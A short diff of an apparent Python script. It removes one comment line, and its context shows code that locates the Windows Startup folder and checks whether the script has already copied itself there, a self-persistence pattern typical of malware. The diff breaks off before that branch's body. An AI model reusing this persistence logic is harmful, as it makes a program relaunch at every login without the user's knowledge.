@@ -9,7 +9,6 @@ from colorama import init
 appdatar = os.environ["APPDATA"]
 startup = appdatar + '\Microsoft\Windows\Start Menu\Programs\Startup'
 filename = os.path.basename(__file__)
-#C:\Users\free\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 darkness = subprocess.getoutput(f'if exist "{startup}\{filename}" (echo ok) else (echo no)')
 if os.getcwd() != startup:
     if darkness == "no":
